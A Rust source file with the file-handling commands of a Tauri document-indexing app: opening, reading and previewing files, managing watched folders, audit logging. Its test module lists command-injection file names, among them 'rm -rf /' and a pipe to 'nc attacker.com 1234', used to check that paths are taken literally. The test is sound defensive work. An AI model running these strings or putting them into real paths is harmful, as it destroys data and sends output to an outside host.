use crate::features::file::dto::{
    FileMetadataDto, GetFileMetadataRequestDto, GetFilePathByIdRequestDto, OpenFileByIdRequestDto,
    OpenFileRequestDto, OpenFileResponseDto, ReadFileBytesRequestDto, ReadFileContentRequestDto,
    ShowInFolderRequestDto,
};
use crate::infrastructure::audit::{get_audit_logger, AuditAction, AuditEvent, AuditResult};
use crate::interfaces::di::Container;
use crate::shared::error::AppError;
use crate::shared::sql_like::directory_prefix_pattern;
use serde::{Deserialize, Serialize};
use std::fs;
use std::sync::Arc;
use tauri::State;

#[derive(Debug, Clone, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct IndexedFolder {
    pub path: String,
    pub recursive: bool,
    pub enabled: bool,
    pub last_scan: Option<String>,
    pub document_count: i64,
    pub created_at: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct IndexingActivity {
    pub id: String,
    pub action: String,
    pub file_path: String,
    pub status: String,
    pub timestamp: String,
    pub details: Option<String>,
}

/// Core implementation - Opens a file in the system's default application or returns internal rendering info
///
/// Opens the specified file using the operating system's default application for that file type.
/// For web articles (detected by article.md + page.html), returns internal rendering info instead.
/// Uses platform-specific APIs to prevent command injection vulnerabilities.
///
/// # Arguments
///
/// * `container` - Service container with security context and path validator
/// * `path` - The absolute path to the file to open
///
/// # Returns
///
/// * `Ok(OpenFileResponseDto)` - Response indicating action taken:
///   - `render_internal`: For web articles, returns path to HTML for internal rendering
///   - `opened_external`: For regular files, indicates file was opened externally
/// * `Err(AppError)` - If validation fails, file doesn't exist, or opening fails
///
/// # Security
///
/// - **Rate Limiting (CWE-770)**: Prevents DoS attacks (50 file operations per minute)
/// - **Path Validation (CWE-22)**: Validates path to prevent directory traversal attacks
/// - **Command Injection Prevention (CWE-78)**: Uses `opener` crate with platform-specific APIs that don't invoke shell
/// - **Audit Logging (CWE-778)**: Logs all file open attempts with success/failure status
pub async fn open_file_impl(
    container: &Container,
    path: String,
) -> Result<OpenFileResponseDto, AppError> {
    let audit_logger = get_audit_logger();

    // SECURITY: Rate limiting to prevent DoS (CWE-770)
    container
        .security_context()
        .rate_limiters()
        .file_operations
        .check_rate_limit("file_operations")
        .await
        .map_err(|e| AppError::RateLimitExceeded(e.to_string()))?;

    let use_case = container.open_file_use_case();
    let request = OpenFileRequestDto { path: path.clone() };
    let result = use_case.execute(request).await;

    match &result {
        Ok(response) => {
            let mut event = AuditEvent::new(
                AuditAction::Custom("file_open".to_string()),
                AuditResult::success(),
            )
            .with_resource_id(&path)
            .with_metadata("operation", "open_file")
            .with_metadata("action", response.action.clone())
            .with_metadata("file_type", format!("{:?}", response.file_type));

            if let Some(title) = &response.title {
                event = event.with_metadata("title", title);
            }

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
        Err(e) => {
            let event = AuditEvent::new(
                AuditAction::Custom("file_open".to_string()),
                AuditResult::failure(e.to_string()),
            )
            .with_resource_id(&path)
            .with_metadata("operation", "open_file");

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
    }

    result
}

/// Legacy Tauri shim - Opens a file in the system's default application or returns internal rendering info
///
/// Opens the specified file using the operating system's default application for that file type.
/// For web articles (detected by article.md + page.html), returns internal rendering info instead.
/// Uses platform-specific APIs to prevent command injection vulnerabilities.
///
/// # Arguments
///
/// * `path` - The absolute path to the file to open
/// * `container` - Service container with security context and path validator
///
/// # Returns
///
/// * `Ok(OpenFileResponseDto)` - Response indicating action taken:
///   - `render_internal`: For web articles, returns path to HTML for internal rendering
///   - `opened_external`: For regular files, indicates file was opened externally
/// * `Err(AppError)` - If validation fails, file doesn't exist, or opening fails
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// // Open a document (returns action info)
/// const response = await invoke<OpenFileResponseDto>('open_file', {
///   path: '/Users/josh/Documents/report.pdf'
/// });
///
/// if (response.action === 'render_internal') {
///   // Render HTML internally
///   renderHTML(response.contentPath, response.title);
/// } else {
///   // File opened externally
///   console.log('Opened externally:', response.contentPath);
/// }
/// ```
#[tauri::command]
#[specta::specta]
pub async fn open_file(
    path: String,
    container: State<'_, Container>,
) -> Result<OpenFileResponseDto, AppError> {
    open_file_impl(&container, path).await
}

/// Core implementation - Opens a file by database ID in the system's default application or returns internal rendering info
///
/// Looks up the file path from the database using the document ID, then either opens it in the
/// system's default application or returns information for internal rendering (for web articles).
///
/// # Arguments
///
/// * `container` - Service container with database pool and security context
/// * `file_id` - The unique database identifier for the document (from documents table)
///
/// # Returns
///
/// * `Ok(OpenFileResponseDto)` - Response indicating action taken
/// * `Err(AppError)` - If file not found, validation fails, or opening fails
///
/// # Security
///
/// - **Rate Limiting (CWE-770)**: Prevents DoS attacks (50 file operations per minute)
/// - **Path Validation (CWE-22)**: Resolves and validates full path before opening
/// - **Command Injection Prevention (CWE-78)**: Uses `opener` crate with safe platform APIs
/// - **Audit Logging (CWE-778)**: Logs file access with ID and resolved path
pub async fn open_file_by_id_impl(
    container: &Container,
    file_id: String,
) -> Result<OpenFileResponseDto, AppError> {
    let audit_logger = get_audit_logger();

    // SECURITY: Rate limiting to prevent DoS (CWE-770)
    container
        .security_context()
        .rate_limiters()
        .file_operations
        .check_rate_limit("file_operations")
        .await
        .map_err(|e| AppError::RateLimitExceeded(e.to_string()))?;

    let use_case = container.open_file_by_id_use_case();
    let request = OpenFileByIdRequestDto {
        document_id: file_id.clone(),
    };
    let result = use_case.execute(request).await;

    match &result {
        Ok(response) => {
            let mut event = AuditEvent::new(
                AuditAction::Custom("file_open".to_string()),
                AuditResult::success(),
            )
            .with_resource_id(&file_id)
            .with_metadata("operation", "open_file_by_id")
            .with_metadata("path", response.content_path.clone())
            .with_metadata("action", response.action.clone())
            .with_metadata("file_type", format!("{:?}", response.file_type));

            if let Some(title) = &response.title {
                event = event.with_metadata("title", title);
            }

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
        Err(e) => {
            let event = AuditEvent::new(
                AuditAction::Custom("file_open".to_string()),
                AuditResult::failure(e.to_string()),
            )
            .with_resource_id(&file_id)
            .with_metadata("operation", "open_file_by_id");

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
    }

    result
}

/// Legacy Tauri shim - Opens a file by database ID in the system's default application or returns internal rendering info
///
/// # Arguments
///
/// * `file_id` - The unique database identifier for the document (from documents table)
/// * `container` - Service container with database pool and security context
///
/// # Returns
///
/// * `Ok(OpenFileResponseDto)` - Response indicating action taken
/// * `Err(AppError)` - If file not found, validation fails, or opening fails
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// const response = await invoke<OpenFileResponseDto>('open_file_by_id', {
///   fileId: 'doc_abc123xyz'
/// });
/// ```
#[tauri::command]
#[specta::specta]
pub async fn open_file_by_id(
    file_id: String,
    container: State<'_, Container>,
) -> Result<OpenFileResponseDto, AppError> {
    open_file_by_id_impl(&container, file_id).await
}

/// Retrieves the absolute file path for a file by its database ID
///
/// Queries the database for the file path using document ID. Useful for displaying
/// file locations or performing file operations that require the full path.
///
/// # Arguments
///
/// * `file_id` - The unique database identifier for the document (from documents table)
/// * `container` - Service container with database pool and security context
///
/// # Returns
///
/// * `Ok(String)` - The absolute file path if file exists on disk
/// * `Err(AppError)` - If file not found in database or doesn't exist on disk
///
/// # Errors
///
/// * `AppError::Other` - Database query failed
/// * `Err(String)` - Document ID not found in database (converted from `ok_or_else`)
/// * `AppError::Other` - File exists in database but not on disk
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// // Get the full path for a file
/// const filePath = await invoke<string>('get_file_path_by_id', {
///   fileId: 'doc_abc123xyz'
/// });
/// console.log(`File located at: ${filePath}`);
/// ```
///
/// # Security
///
/// - **Audit Logging (CWE-778)**: Logs all path access attempts with document ID
/// - **TOCTOU Prevention**: Validates file exists on disk before returning path
///
/// # Command Flow
///
/// 1. Query database for file_path using document ID (from documents table)
/// 2. Verify file exists on disk
/// 3. Log audit event with document ID and resolved path
/// 4. Return absolute path
pub async fn get_file_path_by_id(
    file_id: String,
    container: State<'_, Container>,
) -> Result<String, AppError> {
    let audit_logger = get_audit_logger();

    let use_case = container.get_file_path_by_id_use_case();
    let request = GetFilePathByIdRequestDto {
        document_id: file_id.clone(),
    };
    let response = use_case.execute(request).await?;

    let result = if response.exists {
        Ok(response.path)
    } else {
        Err(AppError::NotFound(format!(
            "File not found on disk: {}",
            response.path
        )))
    };

    // Audit the outcome
    match &result {
        Ok(path) => {
            let event = AuditEvent::new(
                AuditAction::Custom("file_path_access".to_string()),
                AuditResult::success(),
            )
            .with_resource_id(&file_id)
            .with_metadata("operation", "get_file_path")
            .with_metadata("path", path);

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
        Err(e) => {
            let event = AuditEvent::new(
                AuditAction::Custom("file_path_access".to_string()),
                AuditResult::failure(e.to_string()),
            )
            .with_resource_id(&file_id)
            .with_metadata("operation", "get_file_path");

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
    }

    result
}

/// Core implementation - Removes a folder from the watch list and deletes all associated documents
///
/// # Arguments
///
/// * `container` - Service container with database pool and security context
/// * `path` - The folder path to remove from indexing
///
/// # Returns
///
/// * `Ok(())` - Folder and associated documents successfully removed
/// * `Err(AppError)` - If validation fails or database operation fails
///
/// # Security
///
/// - **Path Validation (CWE-22)**: Validates folder path to prevent directory traversal
/// - **SQL Injection Prevention (CWE-89)**: Uses parameterized queries for LIKE clause
/// - **Audit Logging (CWE-778)**: Logs folder deletion with document count
pub async fn remove_indexed_folder_impl(
    container: &Container,
    path: String,
) -> Result<(), AppError> {
    let audit_logger = get_audit_logger();

    let validated_path = container
        .file_access_config()
        .validate_path(&path)
        .map_err(|e| AppError::Other(format!("Invalid path: {}", e)))?;

    let path_str = validated_path.to_string_lossy().to_string();

    // Matches only paths strictly inside this directory, with `LIKE`
    // metacharacters escaped. Binding alone is not enough — see
    // `shared::sql_like` for why a bare `? || '%'` deletes siblings.
    let subtree = directory_prefix_pattern(&path_str);

    // Count documents before deletion for audit metadata
    // repository-barrier-allow: legacy command-owned folder transaction; migrate to a file repository.
    let doc_count: Result<(i64,), _> = sqlx::query_as(
        r#"
        SELECT COUNT(*) as count
        FROM documents
        WHERE file_path = ?1 OR file_path LIKE ?2 ESCAPE '\'
        "#,
    )
    .bind(&path_str)
    .bind(&subtree)
    .fetch_one(container.db_pool())
    .await;

    let result = async {
        // Both deletes must land together: a folder removed from the watch
        // list while its documents survive (or vice versa) leaves the index
        // describing a folder we no longer track.
        let mut tx = container
            .db_pool()
            .begin()
            .await
            .map_err(|e| AppError::Other(format!("Failed to begin transaction: {}", e)))?;

        // repository-barrier-allow: these statements form one legacy cross-table removal transaction.
        sqlx::query(
            r#"
            DELETE FROM watch_folders
            WHERE path = ?
            "#,
        )
        .bind(&path_str)
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Other(format!("Failed to remove indexed folder: {}", e)))?;

        // repository-barrier-allow: paired with the watch-folder delete in the transaction above.
        sqlx::query(
            r#"
            DELETE FROM documents
            WHERE file_path = ?1 OR file_path LIKE ?2 ESCAPE '\'
            "#,
        )
        .bind(&path_str)
        .bind(&subtree)
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Other(format!("Failed to remove documents from folder: {}", e)))?;

        tx.commit()
            .await
            .map_err(|e| AppError::Other(format!("Failed to commit folder removal: {}", e)))?;

        Ok::<(), AppError>(())
    }
    .await;

    // An un-watched folder must stop being readable over file-read IPC.
    if result.is_ok() {
        if let Err(e) = container.refresh_allowed_roots().await {
            tracing::warn!(
                error = %e,
                "failed to refresh file-access allowed roots after folder removal"
            );
        }
    }

    // Audit the outcome
    match &result {
        Ok(_) => {
            let mut event = AuditEvent::new(AuditAction::FileDeleted, AuditResult::success())
                .with_resource_id(&path_str)
                .with_metadata("operation", "remove_indexed_folder")
                .with_metadata("resource_type", "folder");

            if let Ok((count,)) = doc_count {
                event = event.with_metadata("documents_removed", count.to_string());
            }

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
        Err(e) => {
            let event = AuditEvent::new(
                AuditAction::FileDeleted,
                AuditResult::failure(e.to_string()),
            )
            .with_resource_id(&path_str)
            .with_metadata("operation", "remove_indexed_folder")
            .with_metadata("resource_type", "folder");

            if let Err(e) = audit_logger.log(event).await {
                tracing::warn!("Failed to write audit log: {}", e);
            }
        }
    }

    result
}

/// Legacy Tauri shim - Removes a folder from the watch list and deletes all associated documents
///
/// # Arguments
///
/// * `container` - Service container with database pool and security context
/// * `path` - The folder path to remove from indexing
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// await invoke('remove_indexed_folder', {
///   path: '/Users/josh/Documents/Archive'
/// });
/// ```
#[tauri::command]
#[specta::specta]
pub async fn remove_indexed_folder(
    container: State<'_, Container>,
    path: String,
) -> Result<(), AppError> {
    remove_indexed_folder_impl(&container, path).await
}

/// Retrieves all folders currently being watched for indexing
///
/// Returns a list of all folders in the watch list with their configuration and statistics.
/// For each folder, includes the document count, last scan time, and whether the folder
/// is enabled for monitoring.
///
/// # Arguments
///
/// * `container` - Service container with database pool
///
/// # Returns
///
/// * `Ok(Vec<IndexedFolder>)` - List of indexed folders with metadata and document counts
/// * `Err(AppError)` - If database query fails
///
/// # Errors
///
/// * `AppError::Other` - Failed to fetch indexed folders from database
/// * `AppError::Other` - Failed to count documents for a folder
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// interface IndexedFolder {
///   path: string;
///   recursive: boolean;
///   enabled: boolean;
///   lastScan: string | null;
///   documentCount: number;
///   createdAt: string;
/// }
///
/// // Get all indexed folders
/// const folders = await invoke<IndexedFolder[]>('get_indexed_folders');
/// folders.forEach(folder => {
///   console.log(`${folder.path}: ${folder.documentCount} documents`);
/// });
/// ```
///
/// # Security
///
/// - **SQL Injection Prevention (CWE-89)**: Uses parameterized queries for document count
/// - **No Authorization Required**: Listing watch folders is a read-only operation
///
/// # Command Flow
///
/// 1. Query watch_folders table for all folders (ordered by created_at DESC)
/// 2. For each folder, count documents with file_path matching folder path prefix
/// 3. Assemble IndexedFolder struct with metadata and document count
/// 4. Return list of folders
pub async fn get_indexed_folders(
    container: State<'_, Container>,
) -> Result<Vec<IndexedFolder>, AppError> {
    // repository-barrier-allow: legacy read model pending extraction into a file repository.
    let folders = sqlx::query_as::<_, IndexedFolderRow>(
        r#"
        SELECT
            path,
            recursive,
            enabled,
            last_scan,
            created_at
        FROM watch_folders
        ORDER BY created_at DESC
        "#,
    )
    .fetch_all(container.db_pool())
    .await
    .map_err(|e| AppError::Other(format!("Failed to fetch indexed folders: {}", e)))?;

    let mut result = Vec::new();
    for folder in folders {
        // Escaped subtree match — must agree exactly with the pattern used by
        // `remove_indexed_folder_impl`, or the count shown to the user will
        // not match what removal actually deletes.
        // repository-barrier-allow: legacy read-model enrichment pending repository extraction.
        let doc_count: (i64,) = sqlx::query_as(
            r#"
            SELECT COUNT(*) as count
            FROM documents
            WHERE file_path = ?1 OR file_path LIKE ?2 ESCAPE '\'
            "#,
        )
        .bind(&folder.path)
        .bind(directory_prefix_pattern(&folder.path))
        .fetch_one(container.db_pool())
        .await
        .map_err(|e| AppError::Other(format!("Failed to count documents: {}", e)))?;

        result.push(IndexedFolder {
            path: folder.path,
            recursive: folder.recursive,
            enabled: folder.enabled,
            last_scan: folder.last_scan,
            document_count: doc_count.0,
            created_at: folder.created_at,
        });
    }

    Ok(result)
}

#[derive(Debug, sqlx::FromRow)]
struct IndexedFolderRow {
    path: String,
    recursive: bool,
    enabled: bool,
    last_scan: Option<String>,
    created_at: String,
}

/// Retrieves recent indexing activities with configurable limit
///
/// Returns the most recent indexing activities (document indexing operations) ordered
/// by timestamp. Useful for displaying indexing history or monitoring indexing progress.
///
/// # Arguments
///
/// * `container` - Service container with database pool
/// * `limit` - Maximum number of activities to return (capped at 10,000 for safety)
///
/// # Returns
///
/// * `Ok(Vec<IndexingActivity>)` - List of recent indexing activities
/// * `Err(AppError)` - If database query fails
///
/// # Errors
///
/// * `AppError::Other` - Failed to fetch indexing activities from database
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// interface IndexingActivity {
///   id: string;
///   action: string;
///   filePath: string;
///   status: string;
///   timestamp: string;
///   details: string | null;
/// }
///
/// // Get the 100 most recent indexing activities
/// const activities = await invoke<IndexingActivity[]>('get_indexing_activities', {
///   limit: 100
/// });
/// ```
///
/// # Security
///
/// - **DoS Prevention (CWE-770)**: Limit is capped at 10,000 to prevent excessive resource usage
/// - **SQL Injection Prevention**: Uses parameterized queries with bind
///
/// # Command Flow
///
/// 1. Validate and cap limit to maximum of 10,000
/// 2. Query documents table ordered by indexed_at DESC
/// 3. Map database rows to IndexingActivity structs
/// 4. Return list of activities
pub async fn get_indexing_activities(
    container: State<'_, Container>,
    limit: usize,
) -> Result<Vec<IndexingActivity>, AppError> {
    // Validate limit to prevent excessive resource usage
    let safe_limit = limit.min(10000);

    // repository-barrier-allow: legacy indexing-activity read model pending repository extraction.
    let activities = sqlx::query_as::<_, IndexingActivityRow>(
        r#"
        SELECT
            id,
            file_path,
            status,
            indexed_at as timestamp
        FROM documents
        ORDER BY indexed_at DESC
        LIMIT ?
        "#,
    )
    .bind(safe_limit as i64)
    .fetch_all(container.db_pool())
    .await
    .map_err(|e| AppError::Other(format!("Failed to fetch indexing activities: {}", e)))?;

    Ok(activities
        .into_iter()
        .map(|a| IndexingActivity {
            id: a.id,
            action: "indexed".to_string(),
            file_path: a.file_path,
            status: a.status,
            timestamp: a.timestamp,
            details: None,
        })
        .collect())
}

#[derive(Debug, sqlx::FromRow)]
struct IndexingActivityRow {
    id: String,
    file_path: String,
    status: String,
    timestamp: String,
}

/// Core implementation - Reads the content of a file for preview purposes
///
/// # Security
/// - Path validation prevents directory traversal (CWE-22)
/// - File size limited to 10MB to prevent DoS (CWE-770)
/// - Audit logging for security monitoring (CWE-778)
///
/// # Arguments
/// - `container`: Service container with security context
/// - `path`: The absolute path to the file to read
///
/// # Returns
/// The file content as a UTF-8 string
pub async fn read_file_content_impl(
    container: &Container,
    path: String,
) -> Result<String, AppError> {
    let audit_logger = get_audit_logger();

    let use_case = container.read_file_content_use_case();
    let request = ReadFileContentRequestDto { path: path.clone() };
    let result = use_case.execute(request).await;

    match &result {
        Ok(dto) => {
            let event = AuditEvent::new(
                AuditAction::Custom("read_file_content".to_string()),
                AuditResult::success(),
            )
            .with_resource_id(&path)
            .with_metadata("operation", "read_file_content")
            .with_metadata("file_size", dto.size_bytes.to_string().as_str())
            .with_metadata("content_length", dto.content.len().to_string().as_str());

            let logger = Arc::clone(&audit_logger);
            tokio::spawn(async move {
                if let Err(e) = logger.log(event).await {
                    tracing::warn!("Failed to write audit log: {}", e);
                }
            });
        }
        Err(e) => {
            let event = AuditEvent::new(
                AuditAction::Custom("read_file_content".to_string()),
                AuditResult::failure(e.to_string()),
            )
            .with_resource_id(&path)
            .with_metadata("operation", "read_file_content");

            let logger = Arc::clone(&audit_logger);
            tokio::spawn(async move {
                if let Err(e) = logger.log(event).await {
                    tracing::warn!("Failed to write audit log: {}", e);
                }
            });
        }
    }

    match result {
        Ok(dto) => Ok(dto.content),
        Err(AppError::FileTooLarge { size_bytes, .. }) => Err(AppError::InvalidInput(format!(
            "File too large to preview (max 10MB, file is {} bytes)",
            size_bytes
        ))),
        Err(e) => Err(e),
    }
}

/// Core implementation - Reads the content of a file as bytes for preview purposes
///
/// # Security
/// - Path validation prevents directory traversal (CWE-22)
/// - File size limited to prevent DoS (CWE-770)
/// - Audit logging for security monitoring (CWE-778)
///
/// # Arguments
/// - `container`: Service container with security context
/// - `path`: The absolute path to the file to read
///
/// # Returns
/// The file content as raw bytes
pub async fn read_file_bytes_impl(
    container: &Container,
    path: String,
) -> Result<Vec<u8>, AppError> {
    let audit_logger = get_audit_logger();

    let use_case = container.read_file_bytes_use_case();
    let request = ReadFileBytesRequestDto { path: path.clone() };
    let result = use_case.execute(request).await;

    match &result {
        Ok(bytes) => {
            let event = AuditEvent::new(
                AuditAction::Custom("read_file_bytes".to_string()),
                AuditResult::success(),
            )
            .with_resource_id(&path)
            .with_metadata("operation", "read_file_bytes")
            .with_metadata("file_size", bytes.len().to_string().as_str());

            let logger = Arc::clone(&audit_logger);
            tokio::spawn(async move {
                if let Err(e) = logger.log(event).await {
                    tracing::warn!("Failed to write audit log: {}", e);
                }
            });
        }
        Err(e) => {
            let event = AuditEvent::new(
                AuditAction::Custom("read_file_bytes".to_string()),
                AuditResult::failure(e.to_string()),
            )
            .with_resource_id(&path)
            .with_metadata("operation", "read_file_bytes");

            let logger = Arc::clone(&audit_logger);
            tokio::spawn(async move {
                if let Err(e) = logger.log(event).await {
                    tracing::warn!("Failed to write audit log: {}", e);
                }
            });
        }
    }

    match result {
        Ok(bytes) => Ok(bytes),
        Err(AppError::FileTooLarge { size_bytes, .. }) => Err(AppError::InvalidInput(format!(
            "File too large to preview (max 10MB, file is {} bytes)",
            size_bytes
        ))),
        Err(e) => Err(e),
    }
}

/// Legacy Tauri shim - Reads the content of a file for preview purposes
///
/// # Arguments
/// - `path`: The absolute path to the file to read
/// - `container`: Service container with security context
///
/// # Returns
/// The file content as a UTF-8 string
#[tauri::command]
#[specta::specta]
pub async fn read_file_content(
    path: String,
    container: State<'_, Container>,
) -> Result<String, AppError> {
    read_file_content_impl(&container, path).await
}

/// Legacy Tauri shim - Reads the content of a file as bytes for preview purposes
///
/// # Arguments
/// - `path`: The absolute path to the file to read
/// - `container`: Service container with security context
///
/// # Returns
/// The file content as raw bytes
#[tauri::command]
#[specta::specta]
pub async fn read_file_bytes(
    path: String,
    container: State<'_, Container>,
) -> Result<Vec<u8>, AppError> {
    read_file_bytes_impl(&container, path).await
}

/// Core implementation - Retrieves file metadata (size and modification time) for a given path
///
/// # Arguments
///
/// * `container` - Service container with security context
/// * `path` - The absolute path to the file
///
/// # Returns
///
/// * `Ok(FileMetadata)` - File metadata including size and modification time
/// * `Err(AppError)` - If validation fails, file doesn't exist, or metadata retrieval fails
///
/// # Security
///
/// - **Path Validation (CWE-22)**: Validates path to prevent directory traversal attacks
pub async fn get_file_metadata_impl(
    container: &Container,
    path: String,
) -> Result<FileMetadataDto, AppError> {
    let use_case = container.get_file_metadata_use_case();
    let request = GetFileMetadataRequestDto { path };
    let response = use_case.execute(request).await?;

    Ok(response)
}

/// Legacy Tauri shim - Retrieves file metadata (size and modification time) for a given path
///
/// # Arguments
///
/// * `path` - The absolute path to the file
/// * `container` - Service container with security context
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// const metadata = await invoke<FileMetadata>('get_file_metadata', {
///   path: '/Users/josh/Documents/report.pdf'
/// });
/// ```
#[tauri::command]
#[specta::specta]
pub async fn get_file_metadata(
    path: String,
    container: State<'_, Container>,
) -> Result<FileMetadataDto, AppError> {
    get_file_metadata_impl(&container, path).await
}

/// Core implementation - Reveals a file in the system file explorer
///
/// # Arguments
///
/// * `container` - Service container with security context
/// * `path` - The absolute path to the file to reveal
///
/// # Returns
///
/// * `Ok(())` - File successfully revealed in system file explorer
/// * `Err(AppError)` - If validation fails, file doesn't exist, or reveal operation fails
///
/// # Security
///
/// - **Path Validation (CWE-22)**: Validates path to prevent directory traversal attacks
/// - **Command Injection Prevention (CWE-78)**: Uses defense-in-depth approach with platform-specific safety
pub async fn show_in_folder_impl(container: &Container, path: String) -> Result<(), AppError> {
    let use_case = container.show_in_folder_use_case();
    let request = ShowInFolderRequestDto { path };
    use_case.execute(request).await?;
    Ok(())
}

/// Legacy Tauri shim - Reveals a file in the system file explorer
///
/// # Arguments
///
/// * `path` - The absolute path to the file to reveal
/// * `container` - Service container with security context
///
/// # Example
///
/// ```typescript
/// import { invoke } from '@tauri-apps/api/core';
///
/// await invoke('show_in_folder', {
///   path: '/Users/josh/Documents/report.pdf'
/// });
/// ```
#[tauri::command]
#[specta::specta]
pub async fn show_in_folder(path: String, container: State<'_, Container>) -> Result<(), AppError> {
    show_in_folder_impl(&container, path).await
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[cfg(target_os = "windows")]
    #[test]
    fn test_show_in_folder_windows_osstring_safety() {
        // Test that OsString concatenation handles special characters safely
        // These test cases verify the fix for command injection vulnerability

        use std::ffi::OsString;

        let test_cases = vec![
            // Normal path
            (
                r"C:\Users\test\document.txt",
                "C:\\Users\\test\\document.txt",
            ),
            // Path with spaces
            (
                r"C:\Program Files\test app\file.txt",
                "C:\\Program Files\\test app\\file.txt",
            ),
            // Unicode characters
            (r"C:\用户\文档\file.txt", "C:\\用户\\文档\\file.txt"),
            // Apostrophe (common in Irish names like O'Brien)
            (
                r"C:\Users\o'brien\docs\file.txt",
                "C:\\Users\\o'brien\\docs\\file.txt",
            ),
            // Quote character
            (
                r#"C:\Users\test"name\file.txt"#,
                r#"C:\Users\test"name\file.txt"#,
            ),
            // Ampersand
            (
                r"C:\Users\test&name\file.txt",
                "C:\\Users\\test&name\\file.txt",
            ),
            // Semicolon
            (
                r"C:\Users\test;name\file.txt",
                "C:\\Users\\test;name\\file.txt",
            ),
            // Pipe character
            (
                r"C:\Users\test|name\file.txt",
                "C:\\Users\\test|name\\file.txt",
            ),
        ];

        for (input_path, expected_display) in test_cases {
            let path = PathBuf::from(input_path);

            // Test OsString concatenation (same approach as show_in_folder)
            let mut select_arg = OsString::from("/select,");
            select_arg.push(&path);

            // Verify OsString contains both parts
            let as_string = select_arg.to_string_lossy();
            assert!(
                as_string.starts_with("/select,"),
                "Failed for path: {}. OsString: {}",
                input_path,
                as_string
            );
            assert!(
                as_string.contains(input_path) || as_string.contains(expected_display),
                "Failed for path: {}. OsString: {}",
                input_path,
                as_string
            );

            // Most importantly: verify no shell metacharacters can break out of path context
            // The key is that path is added as a single OsString component, not parsed
        }
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_show_in_folder_unix_arg_safety() {
        // Test that individual .arg() calls handle special characters safely
        // on macOS and Linux

        use std::ffi::OsStr;

        let test_cases = vec![
            "/home/user/document.txt",
            "/home/user/file with spaces.txt",
            "/home/用户/文档/file.txt",
            "/home/user/o'brien/file.txt",
            r#"/home/user/"quoted"/file.txt"#,
            "/home/user/file&name.txt",
            "/home/user/file;name.txt",
            "/home/user/file|name.txt",
            "/home/user/file`backtick`.txt",
            "/home/user/file$dollar.txt",
        ];

        for input_path in test_cases {
            let path = PathBuf::from(input_path);

            // Verify PathBuf can be used directly as arg (no conversion needed)
            let os_str: &OsStr = path.as_ref();

            // The key safety property: when passed to Command::arg(),
            // OsStr is NOT parsed as shell command - it's a single argument
            assert_eq!(
                os_str.to_string_lossy(),
                input_path,
                "OsStr should preserve exact path: {}",
                input_path
            );
        }
    }

    #[test]
    fn test_no_command_injection_patterns() {
        // Verify that common command injection patterns are safe
        // with our implementation

        let injection_attempts = vec![
            "file.txt && malicious.exe",
            "file.txt; rm -rf /",
            "file.txt | nc attacker.com 1234",
            "file.txt`whoami`",
            "file.txt$(whoami)",
            "file.txt & calc.exe",
        ];

        for attempt in injection_attempts {
            let path = PathBuf::from(attempt);

            // Our implementation uses OsString/PathBuf which prevents parsing
            // The entire string is treated as a path, not parsed for shell metacharacters
            let os_string = path.as_os_str().to_string_lossy();

            // Verify the whole injection attempt is preserved as-is
            // (not parsed/split by shell metacharacters)
            assert_eq!(
                os_string, attempt,
                "Injection attempt should be preserved as literal path: {}",
                attempt
            );
        }
    }
}
